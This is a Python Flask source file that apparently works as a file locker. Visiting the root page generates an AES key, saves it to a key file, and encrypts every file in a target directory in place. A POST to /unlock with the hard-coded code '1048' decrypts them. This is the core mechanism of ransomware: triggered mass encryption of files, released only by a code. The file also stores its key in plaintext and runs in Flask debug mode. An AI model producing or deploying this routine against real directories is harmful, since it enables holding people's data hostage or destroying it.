import os
import base64
import platform
from flask import Flask, jsonify, request
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

app = Flask(__name__)

# Configuration
ENCRYPTED_FILE = '/path/to/encrypt'
KEY_FILE = '/path/to/key.txt'

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        data = f.read()
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, 'wb') as f:
        f.write(nonce + tag + ciphertext)

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
        with open(file_path, 'wb') as f:
            f.write(data)
    except Exception as e:
        print(f"Decryption failed: {e}")

@app.route('/')
def index():
    # 1. Encrypt files when the user visits the site for the first time
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'rb') as f:
                key = base64.b64decode(f.read())
        else:
            key = get_random_bytes(16)
            with open(KEY_FILE, 'wb') as f:
                f.write(base64.b64encode(key))
            encrypt_directory(ENCRYPTED_FILE, key)
    except Exception as e:
        print(f"Initial encryption failed: {e}")
    
    return open('index.html').read()

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            encrypt_file(os.path.join(root, file), key)

@app.route('/unlock', methods=['POST'])
def unlock():
    # 2. Check password on the server
    data = request.json
    code = data.get('code', '')
    
    # Correct code is "1048"
    if code == '1048':
        try:
            # 3. Decrypt files if correct
            with open(KEY_FILE, 'rb') as f:
                key = base64.b64decode(f.read())
            
            decrypt_directory(ENCRYPTED_FILE, key)
            
            # Return success flag so frontend can redirect
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"success": False, "error": str(e)})
    else:
        return jsonify({"success": False})

def decrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            decrypt_file(os.path.join(root, file), key)

if __name__ == '__main__':
    app.run(debug=True)